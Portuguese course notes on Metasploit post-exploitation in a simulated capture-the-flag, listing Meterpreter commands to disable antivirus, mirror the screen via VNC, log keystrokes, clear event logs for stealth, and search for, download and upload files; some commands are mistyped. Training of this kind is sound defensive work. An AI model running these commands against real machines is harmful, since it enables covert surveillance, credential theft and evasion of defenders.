# Pos exploração - Metaploit extração de dados

    Aqui objetio é praticar a exploração de dados e navegações, experimentando ferramentas automatizantes.

    Vamos simular um Capture de flag, para encontrar o arquivo Flag.

    Aqui ja estamos com a sessão estabelecida usando o meterpreter.

▶️ ⭕ ✒️ 👁️
⭕ https://www.youtube.com/embed/E1E7URK9vhg?controls=0&disablekb=1&enablejsapi=1&fs=0&iv_load_policy=3&modestbranding=1&showinfo=0&rel=0&html5=1&cc_load_policy=0&origin=https%3A%2F%2Fweb.dio.me&widgetid=1&forigin=https%3A%2F%2Fweb.dio.me%2Ftrack%2Fsantander-ciberseguranca-2025%2Fcourse%2Fpos-exploracao%2Flearning%2Ffc8388ed-310d-45cf-bb33-bafa016c1120%3Fautoplay%3D1&aoriginsup=1&vf=6

## Extraindo

✒️ Vamos começar Matando o antviruz para ele não nos atrapalhar ou denunciar.
▶️ run killav   (Mas não funciona, temos outras saidas)

▶️ run post/windows/manage/killav  (sucesso)


✒️ VNC - criamos uma nova sessão e agora estamos espelhando a janela do usuarios capturar a tela, não interagimos igual um TeamViwer mas funciona
▶️ run vnc


✒️ screenshare - Transmite a tela no nosso navegador, para vizualisarmos tudo.
▶️ screenshare

✒️ keyscan_start - Um snefer, vai campturar o teclado, raptando tudo que o usuario escreveu
▶️ keyscan_start
▶️ keyscan_dump (( Para Nos passar tudo que foi digitado))
▶️ keyscan_stop (( Interrompemos o snefer))

✒️ Clearev - Limpa logs do computador para nos manter furtivos
▶️ clearev

## Extraindo de Verdade Agora

✒️ Aqui vamos finalmente rastrear, buscando os pelo ssitema alvo arquivos de acordo com nossos filtros
▶️ sear -d C:/Users - f *.txt

✒️ Download - Vamos baixar nosso alvo, temos alguns parametros para melhorar o processo
    -a enable adaptive dowload buffer size
    -b set the initial block size for the dowload
    -c rusem getting a partially-dowload file
    -h helpp banner
    -l set limit of retires (padrão zero 0)
    -r download recursively
    -t timestamp downloade files
▶️ download c:/user/cassiano/Documents/tete.txt


✒️ Upload - enviar arquivos nosso direto para a maquina do alvo
▶️ upload './arquivo' 'destino'